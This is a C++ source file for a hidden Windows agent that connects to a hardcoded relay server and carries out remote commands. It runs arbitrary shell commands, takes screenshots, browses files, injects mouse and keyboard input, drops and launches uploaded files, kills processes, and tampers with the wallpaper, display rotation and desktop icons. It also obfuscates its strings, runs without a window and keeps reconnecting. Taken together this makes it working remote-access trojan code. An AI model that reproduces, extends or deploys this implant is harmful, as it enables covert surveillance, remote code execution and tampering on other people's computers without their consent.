// ═══════════════════════════════════════════════════════════════════
//  CLIENT — Pure headless console-mode agent
//
//  No GUI, no window, no console spam. Runs as background task.
//  Executes commands relayed from the server through the relay.
// ═══════════════════════════════════════════════════════════════════
#include <winsock2.h>
#include <ws2tcpip.h>

#include "wswin.h"
#include "protocol.h"
#include "protection.h"

#include <windows.h>
#include <gdiplus.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <objbase.h>
#include <shlobj.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <mutex>
#include <atomic>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ── Change this to your OnRender relay URL ──────────────────────────
#ifndef DEFAULT_RELAY_HOST
  #define DEFAULT_RELAY_HOST "relay-server-production-eff8.up.railway.app"
#endif
#ifndef DEFAULT_RELAY_PORT
  #define DEFAULT_RELAY_PORT 443
#endif

// ── State ───────────────────────────────────────────────────────────
static char g_hostBuf[256] = DEFAULT_RELAY_HOST;
static int  g_port         = DEFAULT_RELAY_PORT;
static char g_nameBuf[128] = "Client";
static ws::SocketT g_sock = ws::INVALID;
static std::atomic<bool> g_connected{false};
static uint32_t g_clientId = 0;
static ws::Receiver g_receiver;

// Log
static std::mutex g_logMutex;
static std::vector<std::string> g_log;
static bool g_logDirty = false;

// GDI+
static ULONG_PTR g_gdiplusToken = 0;

// ── Log helper ──────────────────────────────────────────────────────
static void addLog(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    std::lock_guard<std::mutex> lk(g_logMutex);
    g_log.push_back(buf);
    if (g_log.size() > 200) g_log.erase(g_log.begin());
    g_logDirty = true;
}

// ── Encoder CLSID lookup ───────────────────────────────────────────
static bool getEncoderClsid(const wchar_t* mimeType, CLSID* outClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return false;
    auto* enc = (Gdiplus::ImageCodecInfo*)malloc(size);
    if (!enc) return false;
    Gdiplus::GetImageEncoders(num, size, enc);
    bool found = false;
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(enc[i].MimeType, mimeType) == 0) {
            *outClsid = enc[i].Clsid;
            found = true;
            break;
        }
    }
    free(enc);
    return found;
}

// ── Command: Browse Files ──────────────────────────────────────────
struct Entry { bool isDir; uint64_t size; std::string name; };

static void cmdBrowseFiles(const std::string& path, std::vector<uint8_t>& out) {
    std::string search = path;
    if (!search.empty() && search.back() != '\\' && search.back() != '/')
        search += '\\';
    search += '*';

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);

    std::vector<Entry> entries;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::string name = fd.cFileName;
            if (name == ".") continue;
            bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            entries.push_back({isDir, sz, std::move(name)});
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    proto::Writer w;
    w.u32((uint32_t)entries.size());
    for (auto& e : entries) {
        w.u8(e.isDir ? 1 : 0);
        w.u64(e.size);
        w.str(e.name);
    }
    out = w.bytes();
}

// ── Command: System Info ───────────────────────────────────────────
static void cmdSystemInfo(std::vector<uint8_t>& out) {
    std::string info;
    char buf[256];

    // Computer name
    char computer[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(computer);
    GetComputerNameA(computer, &sz);
    info += "Computer Name: "; info += computer; info += "\n";

    // User name
    char user[256] = {};
    sz = sizeof(user);
    GetUserNameA(user, &sz);
    info += "User Name: "; info += user; info += "\n";

    // OS version via RtlGetVersion (not affected by manifest lies)
    HMODULE ntdll = GetModuleHandleW(OBFW(L"ntdll.dll").c_str());
    auto RtlGetVersion = (LONG(WINAPI*)(OSVERSIONINFOEXW*))
        GetProcAddress(ntdll, OBF("RtlGetVersion").c_str());
    OSVERSIONINFOEXW osi = {};
    osi.dwOSVersionInfoSize = sizeof(osi);
    if (RtlGetVersion) RtlGetVersion(&osi);
    snprintf(buf, sizeof(buf), "OS: Windows %lu.%lu.%lu\n",
             osi.dwMajorVersion, osi.dwMinorVersion, osi.dwBuildNumber);
    info += buf;

    // CPU brand
    int cpu[4] = {};
    char brand[49] = {};
    __cpuid(cpu, 0x80000002); memcpy(brand,      cpu, 16);
    __cpuid(cpu, 0x80000003); memcpy(brand + 16, cpu, 16);
    __cpuid(cpu, 0x80000004); memcpy(brand + 32, cpu, 16);
    brand[48] = 0;
    char* p = brand; while (*p == ' ') p++;
    info += "CPU: "; info += p; info += "\n";

    // Cores
    SYSTEM_INFO si = {};
    GetSystemInfo(&si);
    snprintf(buf, sizeof(buf), "Processor Cores: %lu\n", si.dwNumberOfProcessors);
    info += buf;

    // Memory
    MEMORYSTATUSEX mi = {};
    mi.dwLength = sizeof(mi);
    GlobalMemoryStatusEx(&mi);
    snprintf(buf, sizeof(buf), "Total Memory: %llu MB\n",
             (unsigned long long)(mi.ullTotalPhys / (1024 * 1024)));
    info += buf;
    snprintf(buf, sizeof(buf), "Available Memory: %llu MB\n",
             (unsigned long long)(mi.ullAvailPhys / (1024 * 1024)));
    info += buf;

    // Screen resolution
    snprintf(buf, sizeof(buf), "Screen Resolution: %dx%d\n",
             GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    info += buf;

    // Local IP
    char hostname[256] = {};
    gethostname(hostname, sizeof(hostname));
    struct addrinfo hints = {};
    hints.ai_family = AF_INET;
    struct addrinfo* res = nullptr;
    if (getaddrinfo(hostname, nullptr, &hints, &res) == 0 && res) {
        char ipStr[INET_ADDRSTRLEN] = {};
        auto* sa = (struct sockaddr_in*)res->ai_addr;
        inet_ntop(AF_INET, &sa->sin_addr, ipStr, sizeof(ipStr));
        snprintf(buf, sizeof(buf), "Local IP: %s\n", ipStr);
        info += buf;
        freeaddrinfo(res);
    } else {
        info += "Local IP: unknown\n";
    }

    proto::Writer w;
    w.str(info);
    out = w.bytes();
}

// ── Command: View Screen (capture → JPEG/PNG) ─────────────────────
static void cmdViewScreen(std::vector<uint8_t>& out) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w <= 0 || h <= 0) {
        addLog("[!] ViewScreen: invalid screen size %dx%d", w, h);
        proto::Writer wr;
        wr.str("Error: invalid screen size");
        out = wr.bytes();
        return;
    }

    // Capture screen via BitBlt into a DDB
    HDC screenDC = GetDC(nullptr);
    HDC memDC    = CreateCompatibleDC(screenDC);
    HBITMAP hBmp = CreateCompatibleBitmap(screenDC, w, h);
    HBITMAP old  = (HBITMAP)SelectObject(memDC, hBmp);
    BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY);
    SelectObject(memDC, old);

    // Wrap the HBITMAP in a GDI+ Bitmap (FromHBITMAP makes a copy)
    std::unique_ptr<Gdiplus::Bitmap> bmp(Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr));
    DeleteObject(hBmp);
    DeleteDC(memDC);
    ReleaseDC(nullptr, screenDC);

    if (!bmp || bmp->GetLastStatus() != Gdiplus::Ok) {
        addLog("[!] ViewScreen: FromHBITMAP failed");
        proto::Writer wr;
        wr.str("Error: FromHBITMAP failed");
        out = wr.bytes();
        return;
    }

    // Create IStream to hold the encoded image
    IStream* stream = nullptr;
    HRESULT hr = CreateStreamOnHGlobal(nullptr, TRUE, &stream);
    if (FAILED(hr) || !stream) {
        addLog("[!] ViewScreen: CreateStreamOnHGlobal failed");
        proto::Writer wr;
        wr.str("Error: CreateStreamOnHGlobal failed");
        out = wr.bytes();
        return;
    }

    // Try JPEG first, then PNG fallback
    CLSID encClsid = {};
    bool saved = false;

    if (getEncoderClsid(OBFW(L"image/jpeg").c_str(), &encClsid)) {
        Gdiplus::EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid  = Gdiplus::EncoderQuality;
        params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        ULONG quality = 50;
        params.Parameter[0].Value = &quality;

        Gdiplus::Status st = bmp->Save(stream, &encClsid, &params);
        if (st == Gdiplus::Ok) {
            saved = true;
            addLog("[>] ViewScreen: saved as JPEG");
        } else {
            addLog("[!] ViewScreen: JPEG save failed (status=%d), trying PNG", (int)st);
        }
    }

    if (!saved) {
        LARGE_INTEGER zero = {};
        stream->Seek(zero, STREAM_SEEK_SET, nullptr);

        if (getEncoderClsid(OBFW(L"image/png").c_str(), &encClsid)) {
            Gdiplus::Status st = bmp->Save(stream, &encClsid, nullptr);
            if (st == Gdiplus::Ok) {
                saved = true;
                addLog("[>] ViewScreen: saved as PNG");
            } else {
                addLog("[!] ViewScreen: PNG save also failed (status=%d)", (int)st);
            }
        }
    }

    if (saved) {
        STATSTG stat = {};
        stream->Stat(&stat, STATFLAG_NONAME);
        size_t imgSize = (size_t)stat.cbSize.QuadPart;
        if (imgSize > 0) {
            LARGE_INTEGER zero = {};
            stream->Seek(zero, STREAM_SEEK_SET, nullptr);
            out.resize(imgSize);
            ULONG read = 0;
            stream->Read(out.data(), (ULONG)imgSize, &read);
            addLog("[>] ViewScreen: %zu bytes sent", imgSize);
        }
    } else {
        proto::Writer wr;
        wr.str("Error: no image encoder available");
        out = wr.bytes();
        addLog("[!] ViewScreen: no encoder available");
    }

    stream->Release();
}

// ── Command: Execute ────────────────────────────────────────────────
static void cmdExecute(const std::string& cmd, std::vector<uint8_t>& out) {
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        proto::Writer w;
        w.str("Failed to execute command");
        out = w.bytes();
        return;
    }
    std::string output;
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe))
        output += buffer;
    _pclose(pipe);

    proto::Writer w;
    w.str(output);
    out = w.bytes();
}

// ── Command: Mouse Click ───────────────────────────────────────────
static void cmdMouseClick(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    uint32_t x, y; uint8_t button;
    if (!r.u32(x) || !r.u32(y) || !r.u8(button)) {
        proto::Writer w; w.str("Bad payload"); out = w.bytes(); return;
    }
    addLog("[>] Mouse: %u,%u btn=%u", x, y, button);

    SetCursorPos(x, y);
    if (button == 0) { // left click
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    } else if (button == 1) { // right click
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
    } else if (button == 2) { // double click
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    }
    proto::Writer w; w.str("OK"); out = w.bytes();
}

// ── Command: Key Input ─────────────────────────────────────────────
static void cmdKeyInput(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    std::string text;
    r.str(text);
    addLog("[>] Keys: %zu chars", text.size());

    // Type each character using SendInput
    for (char c : text) {
        INPUT input = {};
        input.type = INPUT_KEYBOARD;
        input.ki.wScan = c;
        input.ki.dwFlags = KEYEVENTF_UNICODE;
        SendInput(1, &input, sizeof(INPUT));
        input.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(1, &input, sizeof(INPUT));
    }
    proto::Writer w; w.str("OK"); out = w.bytes();
}

// ── Command: File Upload ───────────────────────────────────────────
static void cmdFileUpload(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    std::string filename;
    if (!r.str(filename)) {
        proto::Writer w; w.str("Bad filename"); out = w.bytes(); return;
    }
    // Remaining bytes are file data
    size_t dataOffset = payload.size() - r.remaining();
    const uint8_t* fileData = payload.data() + dataOffset;
    size_t fileSize = r.remaining();

    // Save to temp dir
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat_s(path, filename.c_str());

    FILE* f = nullptr;
    fopen_s(&f, path, "wb");
    if (!f) {
        proto::Writer w; w.str("Cannot write file"); out = w.bytes(); return;
    }
    fwrite(fileData, 1, fileSize, f);
    fclose(f);

    addLog("[>] File received: %s (%zu bytes) -> %s", filename.c_str(), fileSize, path);
    proto::Writer w; w.str(path); out = w.bytes();
}

// ── Command: Run File ──────────────────────────────────────────────
static void cmdRunFile(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    std::string path;
    r.str(path);
    addLog("[>] Run file: %s", path.c_str());

    HINSTANCE h = ShellExecuteA(nullptr, "open", path.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
    if ((intptr_t)h <= 32) {
        proto::Writer w; w.str("Failed to run file"); out = w.bytes();
    } else {
        proto::Writer w; w.str("OK"); out = w.bytes();
    }
}

// ── Helper: EnumChildWindows callback to find DefView ───────────────
static BOOL CALLBACK FindDefViewProc(HWND hwnd, LPARAM lParam) {
    char cls[256];
    GetClassNameA(hwnd, cls, sizeof(cls));
    if (strcmp(cls, "SHELLDLL_DefView") == 0) {
        *(HWND*)lParam = hwnd;
        return FALSE;
    }
    return TRUE;
}

// ── Command: Process List ──────────────────────────────────────────
static void cmdProcessList(std::vector<uint8_t>& out) {
    addLog("[>] Process list requested");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        proto::Writer w; w.str("Error: Cannot create snapshot"); out = w.bytes(); return;
    }

    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);

    proto::Writer w;
    uint32_t count = 0;
    // First pass: count processes
    if (Process32First(snap, &pe)) {
        do { count++; } while (Process32Next(snap, &pe));
    }
    w.u32(count);

    // Second pass: write data
    if (Process32First(snap, &pe)) {
        do {
            w.u32(pe.th32ProcessID);
            // Get process name as wide->narrow
            char name[260] = {};
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            w.str(std::string(name));
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    out = w.bytes();
    addLog("[<] Process list: %u processes", count);
}

// ── Command: Kill Process ──────────────────────────────────────────
static void cmdKillProcess(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    uint32_t pid;
    if (!r.u32(pid)) {
        proto::Writer w; w.str("Bad PID"); out = w.bytes(); return;
    }
    addLog("[>] Kill process: %u", pid);

    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProc) {
        char buf[128];
        snprintf(buf, sizeof(buf), "Error: OpenProcess failed (%lu)", GetLastError());
        proto::Writer w; w.str(buf); out = w.bytes(); return;
    }
    BOOL ok = TerminateProcess(hProc, 1);
    CloseHandle(hProc);

    if (ok) {
        proto::Writer w; w.str("OK"); out = w.bytes();
        addLog("[<] Process %u terminated", pid);
    } else {
        char buf[128];
        snprintf(buf, sizeof(buf), "Error: TerminateProcess failed (%lu)", GetLastError());
        proto::Writer w; w.str(buf); out = w.bytes();
    }
}

// ── Command: Rotate Screen — change real desktop orientation ──────
//   payload = [angle:4] (0,90,180,270)
static void cmdRotateScreen(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    uint32_t angle;
    if (!r.u32(angle)) { proto::Writer w; w.str("Bad angle"); out = w.bytes(); return; }

    addLog("[>] Rotate screen: %u degrees", angle);

    DEVMODE dm = {};
    dm.dmSize = sizeof(dm);

    // Read the full current display configuration
    if (!EnumDisplaySettingsEx(nullptr, ENUM_CURRENT_SETTINGS, &dm, 0)) {
        proto::Writer w; w.str("Error: EnumDisplaySettingsEx failed");
        out = w.bytes(); return;
    }

    DWORD orient;
    int normAngle = (int)(angle % 360);
    switch (normAngle) {
        case 90:  orient = DMDO_90;  break;
        case 180: orient = DMDO_180; break;
        case 270: orient = DMDO_270; break;
        default:  orient = DMDO_DEFAULT; normAngle = 0; break;
    }

    DWORD oldOrient = dm.dmDisplayOrientation;
    dm.dmFields = DM_DISPLAYORIENTATION | DM_PELSWIDTH | DM_PELSHEIGHT;

    // Critical: when transitioning between portrait and landscape,
    // width/height must be swapped for the mode to be valid.
    bool sidewaysNew = (orient == DMDO_90  || orient == DMDO_270);
    bool sidewaysOld = (oldOrient == DMDO_90 || oldOrient == DMDO_270);
    if (sidewaysNew != sidewaysOld) {
        DWORD tmp = dm.dmPelsWidth;
        dm.dmPelsWidth  = dm.dmPelsHeight;
        dm.dmPelsHeight = tmp;
    }
    dm.dmDisplayOrientation = orient;

    LONG res = ChangeDisplaySettingsEx(
        nullptr, &dm, nullptr,
        CDS_UPDATEREGISTRY | CDS_RESET,    // persistent + immediate
        nullptr);

    char buf[128];
    if (res == DISP_CHANGE_SUCCESSFUL) {
        snprintf(buf, sizeof(buf), "OK: rotated to %d degrees", normAngle);
        addLog("[<] Display rotated to %d", normAngle);
    } else {
        snprintf(buf, sizeof(buf), "Error: ChangeDisplaySettings failed (%ld)", res);
        addLog("[!] Rotate failed: %ld", res);
    }
    proto::Writer w; w.str(buf); out = w.bytes();
}

// ── Command: Set Wallpaper ─────────────────────────────────────────
//   payload = [size:4] [path bytes]
static void cmdSetWallpaper(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    uint32_t sz;
    if (!r.u32(sz) || sz == 0 || sz > 65536) {
        proto::Writer w; w.str("Bad path"); out = w.bytes(); return;
    }
    std::vector<uint8_t> data;
    if (!r.raw(data, sz)) { proto::Writer w; w.str("Truncated"); out = w.bytes(); return; }

    std::string path(data.begin(), data.end());

    // Save uploaded image to %USERPROFILE%\wallpaper.bmp (must be BMP or .jpg)
    char outDir[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, outDir);
    std::string outPath = std::string(outDir) + "\\wallpaper_remote.jpg";

    FILE* f = nullptr;
    fopen_s(&f, outPath.c_str(), "wb");
    if (!f) { proto::Writer w; w.str("Cannot write file"); out = w.bytes(); return; }
    fwrite(data.data(), 1, data.size(), f);
    fclose(f);

    addLog("[>] Wallpaper saved to: %s", outPath.c_str());

    // Update HKCU\Control\Desktop\Wallpaper registry, then apply
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Control\\Desktop", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        const char* wp = outPath.c_str();
        RegSetValueExA(hKey, "Wallpaper", 0, REG_SZ,
            (const BYTE*)wp, (DWORD)(strlen(wp) + 1));
        RegCloseKey(hKey);
    }

    // Apply wallpaper
    BOOL ok = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0,
        (PVOID)outPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    if (ok) {
        proto::Writer w; w.str(outPath); out = w.bytes();
        addLog("[<] Wallpaper applied");
    } else {
        char buf[128]; snprintf(buf, sizeof(buf), "Error: SPI failed (%lu)", GetLastError());
        proto::Writer w; w.str(buf); out = w.bytes();
    }
}

// ── Command: Replace Desktop Icons ────────────────────────────────
//   payload = [icon_path_len:4] [icon_path (UTF-8)]
//   Replaces the icon for EVERY desktop shortcut (.lnk) with the
//   specified icon file. Modifies each .lnk's shell link info.
static void cmdReplaceIcons(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    std::string iconPath;
    if (!r.str(iconPath) || iconPath.empty()) {
        proto::Writer w; w.str("Bad icon path"); out = w.bytes(); return;
    }

    addLog("[>] Replace desktop icons: %s", iconPath.c_str());

    // Verify icon file exists
    DWORD attr = GetFileAttributesA(iconPath.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) {
        proto::Writer w; w.str("Icon file not found"); out = w.bytes(); return;
    }

    // Find desktop folder via SHGetFolderPath
    char desktopPath[MAX_PATH];
    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_DESKTOP, nullptr, 0, desktopPath))) {
        proto::Writer w; w.str("Cannot find Desktop"); out = w.bytes(); return;
    }

    // Search for *.lnk files on Desktop
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*.lnk", desktopPath);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        proto::Writer w; w.str("No .lnk files on Desktop"); out = w.bytes(); return;
    }

    int replaced = 0, failed = 0;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::string fullPath = std::string(desktopPath) + "\\" + fd.cFileName;

            // Open the shortcut as IShellLink
            IShellLinkA* psl = nullptr;
            if (FAILED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
                IID_IShellLinkA, (void**)&psl))) {
                failed++;
                continue;
            }

            IPersistFile* ppf = nullptr;
            if (FAILED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
                psl->Release();
                failed++;
                continue;
            }

            // Wide string path
            int wl = MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, nullptr, 0);
            std::wstring wpath(wl, 0);
            MultiByteToWideChar(CP_ACP, 0, fullPath.c_str(), -1, &wpath[0], wl);

            if (SUCCEEDED(ppf->Load(wpath.c_str(), STGM_READWRITE))) {
                psl->SetIconLocation(iconPath.c_str(), 0);
                ppf->Save(wpath.c_str(), TRUE);  // TRUE = mark dirty
                replaced++;
            } else {
                failed++;
            }
            ppf->Release();
            psl->Release();
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);

    // Notify shell to refresh icons
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST | SHCNF_FLUSHNOWAIT, nullptr, nullptr);

    char buf[128];
    snprintf(buf, sizeof(buf), "OK: %d icons replaced, %d failed", replaced, failed);
    proto::Writer w; w.str(buf); out = w.bytes();
    addLog("[<] %s", buf);
}

// ── Message handler (receiver thread) ───────────────────────────────
static void onMessage(uint8_t msgType, uint8_t cmdType, std::vector<uint8_t> payload) {
    if (msgType == 0) {
        g_connected = false;
        addLog("[!] Disconnected from relay");
        return;
    }
    if (msgType == proto::MSG_KICK_CLIENT) {
        addLog("[!] Kicked by server — exiting");
        printf("\n[!] Kicked by server. Disconnecting...\n");
        if (g_sock != ws::INVALID) {
            ws::close(g_sock);
            g_sock = ws::INVALID;
        }
        Sleep(2000);
        exit(0);
    }
    if (msgType != proto::MSG_COMMAND) return;

    std::vector<uint8_t> resp;

    switch (cmdType) {
    case proto::CMD_BROWSE_FILES: {
        proto::Reader r(payload.data(), payload.size());
        std::string path;
        r.str(path);
        addLog("[>] Browse Files: %s", path.c_str());
        cmdBrowseFiles(path, resp);
        break;
    }
    case proto::CMD_SYSTEM_INFO:
        addLog("[>] System Info requested");
        cmdSystemInfo(resp);
        break;
    case proto::CMD_VIEW_SCREEN:
        addLog("[>] View Screen requested");
        cmdViewScreen(resp);
        break;
    case proto::CMD_EXECUTE: {
        proto::Reader r(payload.data(), payload.size());
        std::string cmd;
        r.str(cmd);
        addLog("[>] Execute: %s", cmd.c_str());
        cmdExecute(cmd, resp);
        break;
    }
    case proto::CMD_MOUSE_CLICK:
        cmdMouseClick(payload, resp);
        break;
    case proto::CMD_KEY_INPUT:
        cmdKeyInput(payload, resp);
        break;
    case proto::CMD_FILE_UPLOAD:
        cmdFileUpload(payload, resp);
        break;
    case proto::CMD_RUN_FILE:
        cmdRunFile(payload, resp);
        break;
    case proto::CMD_PROCESS_LIST:
        cmdProcessList(resp);
        break;
    case proto::CMD_KILL_PROCESS:
        cmdKillProcess(payload, resp);
        break;
    case proto::CMD_DRAW: {
        // Draw on screen: payload = [type:1] [x:4] [y:4] [r:1] [g:1] [b:1] [size:4]
        // type 0=draw, 1=clear, 2=line from last pos
        proto::Reader r(payload.data(), payload.size());
        uint8_t dtype; uint32_t x, y; uint8_t cr, cg, cb; uint32_t sz;
        if (r.u8(dtype) && r.u32(x) && r.u32(y) && r.u8(cr) && r.u8(cg) && r.u8(cb) && r.u32(sz)) {
            if (dtype == 1) {
                // Clear — redraw desktop (InvalidateRect)
                InvalidateRect(nullptr, nullptr, TRUE);
                addLog("[>] Draw: clear");
            } else {
                // Draw dot/line on screen via GDI
                HDC dc = GetDC(nullptr);
                HPEN pen = CreatePen(PS_SOLID, sz, RGB(cr, cg, cb));
                HGDIOBJ old = SelectObject(dc, pen);
                if (dtype == 2) {
                    // Line to this point from last
                    LineTo(dc, x, y);
                } else {
                    MoveToEx(dc, x, y, nullptr);
                    // Draw a small circle
                    SelectObject(dc, GetStockObject(DC_PEN));
                    SetDCPenColor(dc, RGB(cr, cg, cb));
                    SelectObject(dc, GetStockObject(DC_BRUSH));
                    SetDCBrushColor(dc, RGB(cr, cg, cb));
                    Ellipse(dc, x - (int)sz, y - (int)sz, x + (int)sz, y + (int)sz);
                }
                SelectObject(dc, old);
                DeleteObject(pen);
                ReleaseDC(nullptr, dc);
            }
        }
        proto::Writer w; w.str("OK"); resp = w.bytes();
        break;
    }
    case proto::CMD_MESSAGE: {
        // Show message box: payload = [type:1] [text_len:4] [text]
        proto::Reader r(payload.data(), payload.size());
        uint8_t mtype; std::string text;
        if (r.u8(mtype) && r.str(text)) {
            UINT flags = MB_OK;
            if (mtype == 1) flags |= MB_ICONWARNING;
            else if (mtype == 2) flags |= MB_ICONERROR;
            else if (mtype == 3) flags |= MB_ICONINFORMATION;
            MessageBoxA(nullptr, text.c_str(), mtype == 2 ? "Error" : (mtype == 1 ? "Warning" : "Message"), flags);
            addLog("[>] Message box shown: %s", text.c_str());
        }
        proto::Writer w; w.str("OK"); resp = w.bytes();
        break;
    }
    case proto::CMD_ROTATE_SCREEN:
        cmdRotateScreen(payload, resp);
        break;
    case proto::CMD_SET_WALLPAPER:
        cmdSetWallpaper(payload, resp);
        break;
    case proto::CMD_REPLACE_ICONS:
        cmdReplaceIcons(payload, resp);
        break;
    default:
        addLog("[?] Unknown command type: %d", cmdType);
        return;
    }

    auto msg = proto::buildMessage(proto::MSG_RESPONSE, cmdType, resp);
    ws::sendAll(g_sock, msg.data(), msg.size());
}

// ── Connect / Disconnect ───────────────────────────────────────────
static std::atomic<bool> g_connecting{false};

static void doConnect() {
    if (g_connecting) return;
    g_connecting = true;

    if (g_sock != ws::INVALID) {
        g_receiver.stop();
        ws::close(g_sock);
        g_sock = ws::INVALID;
    }
    g_connected = false;
    addLog("[*] Connecting to %s:%d ...", g_hostBuf, g_port);

    std::thread([]() {
        std::string regPayload;
        regPayload.push_back((char)proto::ROLE_CLIENT);
        uint32_t nameLen = (uint32_t)strlen(g_nameBuf);
        regPayload.append((char*)&nameLen, 4);
        regPayload.append(g_nameBuf, nameLen);

        g_sock = ws::connect(std::string(g_hostBuf), g_port, regPayload);
        if (g_sock == ws::INVALID) {
            addLog("[!] Connect failed: %s", ws::lastError().c_str());
            g_connecting = false;
            return;
        }
        g_connected = true;
        g_connecting = false;
        g_receiver.start(g_sock, onMessage);
        addLog("[+] Connected to relay %s:%d", g_hostBuf, g_port);
    }).detach();
}

static void doDisconnect() {
    g_receiver.stop();
    ws::close(g_sock);
    g_sock = ws::INVALID;
    g_connected = false;
    g_clientId = 0;
    addLog("[*] Disconnected");
}

// ── Main ────────────────────────────────────────────────────────────
int main() {
    // ── Pure headless main, no console, no window ─────────────────
    InitializeProtection();
    ws::init();

    // Use computer name as default client name
    DWORD sz = sizeof(g_nameBuf);
    GetComputerNameA(g_nameBuf, &sz);

    // Apply env overrides
    if (const char* env = std::getenv("CLIENT_HOST")) {
        strncpy(g_hostBuf, env, sizeof(g_hostBuf) - 1);
        g_hostBuf[sizeof(g_hostBuf) - 1] = 0;
    }
    if (const char* env = std::getenv("CLIENT_PORT")) {
        g_port = std::atoi(env);
    }
    if (const char* env = std::getenv("CLIENT_NAME")) {
        strncpy(g_nameBuf, env, sizeof(g_nameBuf) - 1);
        g_nameBuf[sizeof(g_nameBuf) - 1] = 0;
    }

    // Auto-reconnect loop with exponential backoff (5s → 60s cap)
    int retryDelay = 5;
    while (true) {
        doConnect();

        // While connected, stay alive (10s poll)
        while (g_connected) {
            Sleep(10000);
        }

        // Cleanup and wait before reconnecting
        if (g_sock != ws::INVALID) {
            ws::close(g_sock);
            g_sock = ws::INVALID;
        }
        g_connected = false;

        Sleep(retryDelay * 1000);
        retryDelay = (retryDelay < 60) ? retryDelay * 2 : 60;
    }

    // Unreachable
    ws::shutdown();
    return 0;
}
